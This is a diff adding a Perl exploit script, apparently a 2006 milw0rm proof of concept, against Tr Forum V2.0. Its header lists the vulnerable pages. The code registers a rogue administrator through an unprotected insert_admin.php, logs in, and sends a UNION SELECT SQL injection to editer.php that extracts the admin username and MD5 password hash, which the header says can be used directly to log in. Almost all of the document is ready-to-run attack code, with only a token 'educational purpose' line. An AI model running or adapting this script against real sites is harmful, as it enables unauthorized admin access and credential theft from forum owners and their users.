@@ -1,0 +1,94 @@
+#!/usr/bin/perl
+#
+# Affected.scr..: Tr Forum V2.0
+# Poc.ID........: 10060903
+# Type..........: SQL Injection, Bypass Security Restriction
+# Risk.level....: Medium
+# Vendor.Status.: Unpatched
+# Src.download..: comscripts.com/scripts/php.tr-forum.1579.html
+# Poc.link......: acid-root.new.fr/poc/10060903.txt
+# Credits.......: DarkFig
+#
+# /membres/modif_profil.php => Profil modification (you can choose the id of the member)
+# /membres/change_mdp.php   => Password modification ( same... )
+# /admin/insert_admin.php   => Second admin (only del post)
+# /admin/editer.php         => SQL Injection without quote
+#
+# You don't need to crack passwd hashes (for the admin panel)...
+# Go to the admin panel (/admin/), enter the username and the hash (not the passwd)... bad security =(
+# This exploit is FOR EDUCATIONAL PURPOSE ONLY x 999
+#
+use LWP::UserAgent;
+use HTTP::Cookies;
+use HTTP::Request::Common "POST";
+use HTTP::Response;
+use Getopt::Long;
+use strict;
+
+print STDOUT "\n+", '-' x 53, "+\n";
+print STDOUT "|    Tr Forum V2.0 Admin MD5 Passwd Hash Disclosure   |\n";
+print STDOUT '+', '-' x 53, "+\n";
+
+my($host,$path,$proxh,$proxu,$proxp);
+my $opt = GetOptions(
+   'host=s'   =>  \$host,
+   'path=s'   =>  \$path,
+   'proxh=s'  =>  \$proxh,
+   'proxu=s'  =>  \$proxu,
+   'proxp=s'  =>  \$proxp);
+
+if(!$host) {
+    print STDOUT "| Usage: ./xx.pl --host=[www] --path=[/] [Options]    |\n";
+    print STDOUT "| [Options] --proxh=[ip] --proxu=[user] --proxp=[pwd] |\n";
+    print STDOUT '+', '-' x 53, "+\n";
+    exit(0);
+}
+
+if($host  !~ /http/) {$host = 'http://'.$host;}
+if($proxh !~ /http/ && $proxh != '') {$proxh = 'http://'.$proxh.'/';}
+if(!$path) {$path = '/';}
+
+print STDOUT " [!]Host..: $host\n";
+print STDOUT " [!]Path..: $path\n";
+print STDOUT " [~]Admin user...\n";
+sleep(1);
+
+my $cc = HTTP::Cookies->new();
+my $ua = LWP::UserAgent->new();
+   $ua->cookie_jar($cc);
+   $ua->agent('0xzilla');
+   $ua->timeout(30);
+   $ua->proxy(['http'] => $proxh) if $proxh;
+
+my $re = POST $host.$path.'/admin/insert_admin.php',[
+         'login'    => 'AcidSploitWasHere',
+         'password' => 'psychopasswd',
+         'mail'     => 'nospam@bot.com',
+         ];
+   $re->proxy_authorization_basic($proxu, $proxp) if $proxp;
+   $ua->request($re);
+
+print STDOUT " [+]User..: AcidSploitWasHere\n";
+print STDOUT " [+]Pass..: psychopasswd\n";
+print STDOUT " [!]Rights: 2 (medium)\n";
+print STDOUT " [~]Collecting admin's hash/username...\n";
+sleep(1);
+
+my $re = POST $host.$path.'index.php',[
+         'login'   => 'AcidSploitWasHere',
+         'pwd'     => 'psychopasswd',
+        ];
+   $ua->request($re);
+
+my $re = $ua->get($host.$path.'admin/editer.php?id2=-1 UNION SELECT pass,pseudo,0 FROM tr_user_forum');
+
+if($re->content =~ /">([a-z0-9]{32})<\/font>/) {
+                print STDOUT "\n ".$1.'::';}
+
+if($re->content =~ /;">(.*?)<\/textarea>/) {
+                print STDOUT $1.' (root)';}
+
+print STDOUT "\n+", '-' x 53, "+\n";
+exit(0);
+
+# milw0rm.com [2006-09-04]
